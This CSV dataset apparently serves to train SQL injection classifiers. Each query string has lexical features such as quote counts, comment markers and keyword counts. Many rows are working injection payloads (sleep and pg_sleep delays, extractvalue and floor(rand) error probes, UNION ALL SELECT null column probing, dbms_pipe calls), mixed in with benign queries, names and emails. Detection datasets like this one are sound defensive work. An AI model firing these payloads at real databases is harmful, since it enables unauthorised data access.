,Query,no_single_qts,no_double_qts,no_punct,no_single_cmnt,no_mult_cmnt,no_space,no_perc,no_log_opt,no_arith,no_null,no_hexa,no_alpha,no_digit,len_of_chr_char_null,genuine_keywords,log_query_len,box_query_len
17331,"c/ juan de bustamante, 30, 10b",0,0,3,0,0,5,0,0,1,0,0,18,4,0,0,3.4011973816621555,4.412867051146341
18018,d75a4r45der,0,0,0,0,0,0,0,0,0,0,0,6,5,0,0,2.3978952727983707,2.8749024412290907
22497,select * from lady fetch first 3 rows only,0,0,1,0,0,8,0,0,1,0,0,32,1,0,3,3.737669618283368,4.981567234930947
13101,pilocarpina,0,0,0,0,0,0,0,0,0,0,0,11,0,0,0,2.3978952727983707,2.8749024412290907
24437,select * from slowly,0,0,1,0,0,3,0,0,1,0,0,16,0,0,1,2.995732273553991,3.7638991627446954
23264,select * from realize where    not tent = 'funny',2,0,4,0,0,8,0,1,1,0,0,34,0,0,1,3.8918202981106265,5.251655965920898
21275,"   select employees.fence, count ( orders.volumeid )  as chamberfrom    ( ordersinner join sister on orders.layersid  =  employees.cloudid ) ",0,0,10,0,0,18,0,0,0,0,0,105,0,0,3,4.948759890378168,7.277936646208279
7927,"1 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",0,0,16,0,0,21,0,1,0,0,1,37,35,0,1,4.934473933130692,7.248396945100476
26017,select * from itself where made = 'equal'  or universe = 'concerned',4,0,7,0,0,11,0,1,1,0,0,49,0,0,1,4.219507705176107,5.846543550882007
29131,"  select difficultyid as id, save as even from highest",0,0,1,0,0,9,0,0,0,0,0,43,0,0,1,3.9889840465642745,5.42506920217274
19520,"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 347697 )  order by meta_id asc",0,0,10,0,0,15,0,0,0,0,0,71,6,0,2,4.6443908991413725,6.6618055138595045
3737,"1  )   where 5465  =  5465 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",0,0,15,1,0,24,0,1,3,0,0,76,16,0,2,4.997212273764115,7.378587043391221
19819,"  select position ( ""3"" in ""w3schools.com"" )  as matchposition;",0,4,8,0,0,9,0,0,0,0,0,42,2,0,1,4.143134726391533,5.7053230539652695
6227,1'   )    )    as dqdv where 8126  =  8126 and 4595  =  4595#,1,0,6,0,0,12,0,1,0,0,0,14,17,0,0,4.110873864173311,5.646144513813471
8016,"1'  )   as bvvl where 9818  =  9818 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1,0,34,1,0,51,0,1,4,0,0,108,43,1,4,5.662960480135946,8.836668403825938
9302,-4758%'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   '%'  =  ',8,0,26,0,0,29,2,4,1,0,0,55,18,0,1,5.062595033026967,7.515548459825613
7345,"1'   )    )    as qzyp where 5081  =  5081 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",1,0,27,1,0,32,0,4,2,0,0,47,24,4,0,5.087596335232384,7.56826919695837
390,or sleep  (  __time__  )    =  ',1,0,8,0,0,6,0,0,0,0,0,11,0,0,0,3.4657359027997265,4.519779854678687
6637,"select pg_sleep  (  5  )   and ""ilyw"" like ""ilyw",0,3,6,0,0,8,0,1,0,0,0,28,1,0,1,3.871201010907891,5.215173163969822
23232,select nation ( s ) from spend inner join,0,0,2,0,0,8,0,0,0,0,0,31,0,0,2,3.713572066704308,4.939896154656966
13653,cotner,0,0,0,0,0,0,0,0,0,0,0,6,0,0,0,1.791759469228055,2.0498957009511405
20104,"select nullif ( 25, ""hello"" ) ;",0,2,6,0,0,6,0,0,0,1,0,17,2,1,1,3.4339872044851463,4.467059038127735
8296,"1%""  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""%""  =  """,0,4,19,0,0,21,2,2,1,0,0,34,13,0,2,4.74493212836325,6.862288715935788
24727,select * from compass,0,0,1,0,0,3,0,0,1,0,0,17,0,0,1,3.044522437723423,3.839958531231341
3234,"1'  )   as ghks where 5128  =  5128 union all select null,null,null,null,null,null,null,null,null,null#",1,0,13,0,0,11,0,0,0,10,0,65,9,10,1,4.634728988229636,6.642694885740106
23737,"  select taken,satisfied from this where teach = 'dear' union select jar, step from scene",2,0,5,0,0,14,0,0,0,0,0,69,0,0,2,4.48863636973214,6.357017110069445
28836,"  select hurryid as id, modern as broke from stage",0,0,1,0,0,9,0,0,0,0,0,39,0,0,1,3.912023005428146,5.287509109454676
26859,select * from low where thee not between 'enjoy' and 'factor',4,0,5,0,0,10,0,2,1,0,0,46,0,0,1,4.110873864173311,5.646144513813471
17889,montesano_wontner@pcvirus.tm,0,0,3,0,0,0,0,0,0,0,0,25,0,0,0,3.332204510175204,4.299691526222142
7633,-9178'  )   or 9779  =  6351,1,0,4,0,0,5,0,1,1,0,0,2,12,0,0,3.332204510175204,4.299691526222142
13932,7.47e+15,0,0,2,0,0,0,0,0,1,0,0,1,5,0,0,2.079441541679836,2.432300417938136
3972,"-4807' where 3232  =  3232 or make_set  (  6599  =  5179,5179  )  --",1,0,10,1,0,12,0,1,3,0,0,14,24,0,0,4.219507705176107,5.846543550882007
19956,"select date_sub ( ""2017-06-15 09:34:21"", interval 15 minute ) ;",0,2,11,0,0,9,0,0,2,0,0,27,16,0,1,4.143134726391533,5.7053230539652695
27058,select * from snow where search between party09/01/1996stop and hidden15/31/1996ourselves,0,0,5,0,0,9,0,1,5,0,0,59,16,0,1,4.48863636973214,6.357017110069445
16177,"puerta del sol 124, 8?h",0,0,2,0,0,4,0,0,0,0,0,13,4,0,0,3.1354942159291497,3.983240309714999
20989,select * from hurt where morning = 'summer',2,0,4,0,0,7,0,0,1,0,0,32,0,0,1,3.7612001156935615,5.022400427811018
21129,select * from saved where satellites = 'evening' fetch first 3 rows only,2,0,4,0,0,12,0,0,1,0,0,55,1,0,3,4.276666119016055,5.953276820822519
25816,select * from limited where leader = 'farmer',2,0,4,0,0,7,0,0,1,0,0,34,0,0,1,3.80666248977032,5.101693885125393
29814,"  select driverid as id, string as year from event",0,0,1,0,0,9,0,0,0,0,0,39,0,0,1,3.912023005428146,5.287509109454676
19060,6.74e+15,0,0,2,0,0,0,0,0,1,0,0,1,5,0,0,2.079441541679836,2.432300417938136
5737,"1' or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'akki'  =  'akki",4,0,34,0,0,47,0,2,2,0,0,107,35,1,4,5.60947179518496,8.7141768124737
7016,"1'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   ",1,0,18,0,0,22,0,1,0,0,1,36,35,0,1,4.969813299576001,7.321582942195207
12358,salip altares,0,0,0,0,0,1,0,0,0,0,0,12,0,0,0,2.5649493574615367,3.1155015354702966
17458,rubi de biasi,0,0,0,0,0,2,0,0,0,0,0,11,0,0,0,2.5649493574615367,3.1155015354702966
29918,"  select add,putting,frame from clean left join orders on recently.courseid =  cage.thirty order by planet.though",0,0,6,0,0,14,0,0,0,0,0,91,0,0,3,4.727387818712341,6.827090900265457
6737,"-5826""   )    )    union all select 7192,7192#",0,1,6,0,0,6,0,0,1,0,0,14,12,0,1,3.828641396489095,5.140218969441503
21609,select * from worth fetch first 50 percent rows only,0,0,1,0,0,9,0,0,1,0,0,40,2,0,3,3.951243718581428,5.357417698153898
4425,"1' and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and 'tqvy' like 'tqvy",4,0,19,0,0,21,0,2,1,0,0,78,10,0,2,4.948759890378168,7.277936646208279
29318,select * from end where empty not between 'oxygen' and 'everywhere',4,0,5,0,0,10,0,2,1,0,0,52,0,0,1,4.204692619390966,5.819025031871101
26689,select plane from equipment union all select but from contrast order by birds,0,0,0,0,0,12,0,0,0,0,0,65,0,0,3,4.343805421853684,6.0797984693327525
29000,select * from children 3 select * from desert,0,0,2,0,0,8,0,0,2,0,0,34,1,0,2,3.80666248977032,5.101693885125393
6344,"1  )   as qeav where 8127  =  8127 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",0,0,51,1,0,82,0,1,12,0,0,103,55,12,2,5.940171252720432,9.487157643523846
4440,"-6200' where 9150  =  9150 union all select 9150,9150,9150,9150,9150,9150,9150#",1,0,10,0,0,8,0,0,1,0,0,19,40,0,1,4.3694478524670215,6.128451232979604
25912,select count ( * )  as favorite,0,0,3,0,0,6,0,0,1,0,0,21,0,0,2,3.4339872044851463,4.467059038127735
15482,40531,0,0,0,0,0,0,0,0,0,0,0,0,5,0,0,1.6094379124341005,1.8157827456852256
12741,6.31e+15,0,0,2,0,0,0,0,0,1,0,0,1,5,0,0,2.079441541679836,2.432300417938136
24860,select * from born fetch first 50 percent rows only,0,0,1,0,0,9,0,0,1,0,0,39,2,0,3,3.9318256327243257,5.322755734775789
16924,romanones,0,0,0,0,0,0,0,0,0,0,0,9,0,0,0,2.19722457733622,2.593591245490939
12494,kin-yee,0,0,1,0,0,0,0,0,1,0,0,6,0,0,0,1.9459101490553128,2.25279015210122
9924,"1%""  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",0,1,10,0,0,12,1,1,0,0,1,16,21,0,0,4.31748811353631,6.030055566276218
7607,1   )    )    as hxtp where 5478  =  5478 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,0,0,11,1,0,21,0,1,2,0,0,31,18,0,1,4.653960350157523,6.680760037190909
21197," select * from extra order by outside, hospital",0,0,2,0,0,8,0,0,1,0,0,37,0,0,2,3.8501476017100575,5.178036175455065
12853,depp@rpdkorea.il,0,0,2,0,0,0,0,0,0,0,0,14,0,0,0,2.772588722239781,3.4229084603450888
19586,select * from customers  order by country desc;,0,0,2,0,0,7,0,0,1,0,0,37,0,0,2,3.8501476017100575,5.178036175455065
18819,37759460s,0,0,0,0,0,0,0,0,0,0,0,1,8,0,0,2.19722457733622,2.593591245490939
20784,select trail from tie,0,0,0,0,0,3,0,0,0,0,0,18,0,0,1,3.044522437723423,3.839958531231341
16141,kaunas,0,0,0,0,0,0,0,0,0,0,0,6,0,0,0,1.791759469228055,2.0498957009511405
26117,select * from four where sail = 'influence'  and  ( later = 'movement' or safety = 'sleep' ) ,6,0,12,0,0,18,0,2,1,0,0,61,0,0,1,4.532599493153256,6.442340659113198
23809,select * from yes where strength not between 'country' and 'tie',4,0,5,0,0,10,0,2,1,0,0,49,0,0,1,4.158883083359672,5.734313559436426
9062,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ""jkfk""  =  ""jkfk",0,3,14,0,0,18,0,1,1,0,0,80,4,0,2,4.812184355372417,6.9980558521596
25210,select progress ( s )  from important select clay from tell,0,0,2,0,0,10,0,0,0,0,0,46,0,0,2,4.07753744390572,5.5852871348767055
17319,ferrandez cabaas,0,0,0,0,0,1,0,0,0,0,0,15,0,0,0,2.772588722239781,3.4229084603450888
9184,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  'squj'  =  'squj",3,0,15,0,0,19,0,1,1,0,0,80,3,0,2,4.90527477843843,7.188213210536463
17621,34481916v,0,0,0,0,0,0,0,0,0,0,0,1,8,0,0,2.19722457733622,2.593591245490939
1318,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual--",0,0,22,1,0,22,0,3,2,0,0,48,10,4,1,4.812184355372417,6.9980558521596
28513,select * from bound where magnet = 'nearly' fetch first 3 rows only,2,0,4,0,0,12,0,0,1,0,0,50,1,0,3,4.204692619390966,5.819025031871101
5272,"1 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  # myqr",0,0,30,0,0,45,0,1,2,0,0,101,35,1,4,5.552959584921617,8.585803340962874
25188,select * from alone where never between act09/01/1996say and keep15/31/1996meat,0,0,5,0,0,9,0,1,5,0,0,49,16,0,1,4.3694478524670215,6.128451232979604
12424,ashberry,0,0,0,0,0,0,0,0,0,0,0,8,0,0,0,2.079441541679836,2.432300417938136
5621,1%'   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1,0,15,0,0,20,1,1,1,0,0,28,2,0,2,4.584967478670572,6.544698632292425
2980,-7453'   )    )     )   or 8571  =  8571--,1,0,8,1,0,7,0,1,3,0,0,2,12,0,0,3.737669618283368,4.981567234930947
1068,"1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",1,0,10,0,0,13,0,1,0,0,0,10,10,0,0,4.158883083359672,5.734313559436426
29989,select count ( least ) from massage,0,0,2,0,0,6,0,0,0,0,0,27,0,0,2,3.555348061489413,4.669921102482963
13339,garner3,0,0,0,0,0,0,0,0,0,0,0,6,1,0,0,1.9459101490553128,2.25279015210122
14861,cervera de la caada,0,0,0,0,0,3,0,0,0,0,0,16,0,0,0,2.9444389791664403,3.684523708911846
16271,remante,0,0,0,0,0,0,0,0,0,0,0,7,0,0,0,1.9459101490553128,2.25279015210122
22643,"   select stranger,studying,minute,process,smaller     (  (  specific join means on order.loss =  correctly.sort )   inner join droppedon orders.plenty =  home.justid ) ",0,0,14,0,0,20,0,0,0,0,0,123,0,0,3,5.1298987149230735,7.657915543392
10957,"-4711%""   )    )    union all select 6737,6737,6737,6737#",0,1,9,0,0,6,1,0,1,0,0,14,20,0,1,4.04305126783455,5.522643883333643
30675,select avg ( yet ) from wrong,0,0,2,0,0,6,0,0,0,0,0,21,0,0,2,3.367295829986474,4.357111686472804
15230,9.97e+15,0,0,2,0,0,0,0,0,1,0,0,1,5,0,0,2.079441541679836,2.432300417938136
12994,dao,0,0,0,0,0,0,0,0,0,0,0,3,0,0,0,1.0986122886681098,1.19230319601282
20588,select count ( distinct light )  from weigh,0,0,2,0,0,7,0,0,0,0,0,33,0,0,2,3.7612001156935615,5.022400427811018
25117,"   select employees.bound, count ( orders.thirdid )  as mineralsfrom    ( ordersinner join off on orders.theeid  =  employees.minuteid ) ",0,0,10,0,0,18,0,0,0,0,0,101,0,0,3,4.919980925828125,7.218492443414831
15252,heldabrand5@chevrolet-volt.bg,0,0,3,0,0,0,0,0,1,0,0,25,1,0,0,3.367295829986474,4.357111686472804
29861, update visit set differ = 'wash'where drive = 'goes',4,0,6,0,0,9,0,0,0,0,0,38,0,0,0,3.970291913552122,5.391515666300752
4984,1'  )   where 1424  =  1424 and sleep  (  5  )  --,1,0,7,1,0,11,0,1,2,0,0,13,10,0,0,3.912023005428146,5.287509109454676
6177,"1"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  ",0,1,22,0,0,24,0,4,0,0,0,37,16,4,0,4.795790545596741,6.964836608637794
6863,"1'  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  ",1,0,29,0,0,36,0,4,0,1,0,52,24,6,0,5.187385805840755,7.780638056689023
17709,b4rl942r7,0,0,0,0,0,0,0,0,0,0,0,4,5,0,0,2.19722457733622,2.593591245490939
11790,50645313a,0,0,0,0,0,0,0,0,0,0,0,1,8,0,0,2.19722457733622,2.593591245490939
29949,select * from day where not powerful = 'married'  and not stepped = 'plan',4,0,7,0,0,13,0,2,1,0,0,53,0,0,1,4.30406509320417,6.004758445183105
15889,pecelln,0,0,0,0,0,0,0,0,0,0,0,7,0,0,0,1.9459101490553128,2.25279015210122
25948,select * from  ( select particles from mission ) ,0,0,3,0,0,9,0,0,1,0,0,36,0,0,2,3.8918202981106265,5.251655965920898
7609,-7561  )   as ilrm where 8828  =  8828 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,4,0,19,1,0,29,0,3,3,0,0,63,26,0,1,5.030437921392435,7.448022400972698
9718,"-3377""  )   or 4982  =  6608#",0,1,5,0,0,5,0,1,1,0,0,2,12,0,0,3.367295829986474,4.357111686472804
18569,0ntrecerrar,0,0,0,0,0,0,0,0,0,0,0,10,1,0,0,2.3978952727983707,2.8749024412290907
13636,angeliek,0,0,0,0,0,0,0,0,0,0,0,8,0,0,0,2.079441541679836,2.432300417938136
2378,"1'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'hfqz'  =  'hfqz",4,0,20,0,0,26,0,2,1,0,0,75,8,0,2,5.075173815233827,7.542049364654595
7546,1  )   as uuro where 6784  =  6784,0,0,2,0,0,7,0,0,0,0,0,11,9,0,0,3.5263605246161616,4.621137163019105
21915,select * from kill fetch first 3 rows only select top 50 percent * from smooth,0,0,2,0,0,15,0,0,2,0,0,58,3,0,5,4.356708826689592,6.104257869167092
25452,select * from vertical where ready = 'paid' fetch first 3 rows only,2,0,4,0,0,12,0,0,1,0,0,50,1,0,3,4.204692619390966,5.819025031871101
11602,9.27e+15,0,0,2,0,0,0,0,0,1,0,0,1,5,0,0,2.079441541679836,2.432300417938136
7452,"1'   )    )    and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   'yzdp'  =  'yzdp",4,0,36,0,0,46,0,2,2,0,1,60,71,0,4,5.659482215759621,8.828673701753054
8099,-3752%' union all select 9351--,1,0,5,1,0,4,1,0,3,0,0,14,8,0,1,3.4339872044851463,4.467059038127735
28588, update evening set describe = 'song'where section = 'whenever',4,0,6,0,0,9,0,0,0,0,0,48,0,0,0,4.143134726391533,5.7053230539652695
3315,"1"" and make_set  (  8403  =  8403,8899  )  ",0,1,6,0,0,8,0,1,0,0,0,10,13,0,0,3.7612001156935615,5.022400427811018
19314,"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 7064 )  order by meta_id asc",0,0,10,0,0,15,0,0,0,0,0,71,4,0,2,4.624972813284271,6.623425332724987
21380,select count ( * )  as skill,0,0,3,0,0,6,0,0,1,0,0,18,0,0,2,3.332204510175204,4.299691526222142
11716,sant andreu de la barca,0,0,0,0,0,4,0,0,0,0,0,19,0,0,0,3.1354942159291497,3.983240309714999
4065,1'  )   where 1502  =  1502 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,1,0,71,1,0,92,0,14,2,0,0,106,59,13,2,6.0473721790462776,9.745904059698558
3842,"-7184  )   as fshx where 3408  =  3408 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dua",0,0,35,0,0,53,0,6,1,0,0,75,45,5,1,5.541263545158426,8.559367492058051
26369,select * from breeze where find between drop09/01/1996blind and dish15/31/1996rabbit,0,0,5,0,0,9,0,1,5,0,0,54,16,0,1,4.430816798843313,6.245637257588747
22904,select top 3 * from hard where instead = 'his' select * from next,2,0,5,0,0,13,0,0,2,0,0,46,1,0,3,4.174387269895637,5.762920220853171
8225,"-9577'||  (  select 'vloa' from dual where 7184  =  7184 union all select 7184,7184#",3,0,10,0,0,13,0,1,1,0,0,37,20,0,2,4.430816798843313,6.245637257588747
28294, update grain set bark = 'tower'where easier = 'coast',4,0,6,0,0,9,0,0,0,0,0,39,0,0,0,3.9889840465642745,5.42506920217274
2442,-8465' where 5242  =  5242 or 3806  =  7423--,1,0,6,1,0,8,0,1,3,0,0,7,20,0,0,3.80666248977032,5.101693885125393
15873,tehchi8,0,0,0,0,0,0,0,0,0,0,0,6,1,0,0,1.9459101490553128,2.25279015210122
18440,enjoyelada,0,0,0,0,0,0,0,0,0,0,0,10,0,0,0,2.302585092994046,2.7402564225600523
11556,4135,0,0,0,0,0,0,0,0,0,0,0,0,4,0,0,1.3862943611198906,1.5376610839645055
1939,"1%'   )    )     )   union all select null,null--",1,0,8,1,0,7,1,0,2,2,0,22,1,2,1,3.8918202981106265,5.251655965920898
20022,"  select str_to_date ( ""august,5,2017"", ""%m %e %y"" ) ;",0,4,15,0,0,9,3,0,0,0,0,24,5,0,1,3.9889840465642745,5.42506920217274
29540,"  select direction,engine from kitchen where want = 'yes' union select shut, even from behavior",2,0,5,0,0,14,0,0,0,0,0,75,0,0,2,4.553876891600541,6.483834243658689
5829,"1""  )   as ktnq where 9005  =  9005",0,1,3,0,0,7,0,0,0,0,0,11,9,0,0,3.555348061489413,4.669921102482963
13843,gumersindo,0,0,0,0,0,0,0,0,0,0,0,10,0,0,0,2.302585092994046,2.7402564225600523
19343,"select wp_posts.id from wp_posts where 1 = 1 and wp_posts.post_type  =  'acf-field' and   (  (  wp_posts.post_status  =  'publish'  )  )   and wp_posts.post_name  =  'field_5f6c82a3dbb22' order by wp_posts.menu_order asc, wp_posts.post_title asc limit 0, 1",6,0,36,0,0,32,0,3,1,0,0,163,11,0,2,5.545177444479562,8.568208781379385
8025,"-4707' union all select 4414,4414,4414,4414,4414,4414#",1,0,8,0,0,4,0,0,1,0,0,14,28,0,1,3.9889840465642745,5.42506920217274
20122,"  update customers  set contactname  =  'alfred schmidt', city =  'frankfurt' where customerid  =  1;",4,0,9,0,0,14,0,0,0,0,0,70,1,0,0,4.61512051684126,6.603993955492575
19460,select option_value from wp_options where option_name  =  '_options_footer_button_3_link' limit 1,2,0,11,0,0,9,0,0,0,0,0,73,2,0,1,4.574710978503383,6.524589271310591
29367," select * from helpful order by new, new",0,0,2,0,0,8,0,0,1,0,0,30,0,0,2,3.688879454113936,4.897348914472564
23759,select * from establish order by neck desc,0,0,1,0,0,7,0,0,1,0,0,34,0,0,2,3.737669618283368,4.981567234930947
29718,"  select river as mainly, least as [friend]  from exactly",0,0,3,0,0,9,0,0,0,0,0,43,0,0,1,4.04305126783455,5.522643883333643
9196,"1%'   )    )     )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  '%'  =  '",4,0,60,0,0,84,2,2,10,0,0,95,47,12,2,5.978885764901122,9.580131198423656
26049,select * from truth fetch first 3 rows only select top 50 percent * from hall,0,0,2,0,0,15,0,0,2,0,0,57,3,0,5,4.343805421853684,6.0797984693327525
9650,1'||  (  select 'yhpe' where 8010  =  8010 rlike   (  select   (  case when   (  7910  =  3752  )   then 1 else 0x28 end   )    )     )  ||',4,0,18,0,0,27,0,2,0,0,1,46,21,0,2,4.941642422609304,7.263211790926113
23558,select * from he where deep = 'dug'  and  ( connected = 'picture' or place = 'now' ) ,6,0,12,0,0,18,0,2,1,0,0,53,0,0,1,4.442651256490317,6.268357393526619
21088,select * from fly where trace = 'rubbed',2,0,4,0,0,7,0,0,1,0,0,29,0,0,1,3.688879454113936,4.897348914472564
11066,"1""  )   where 3321  =  3321",0,1,3,0,0,5,0,0,0,0,0,5,9,0,0,3.295836866004329,4.240494654101009
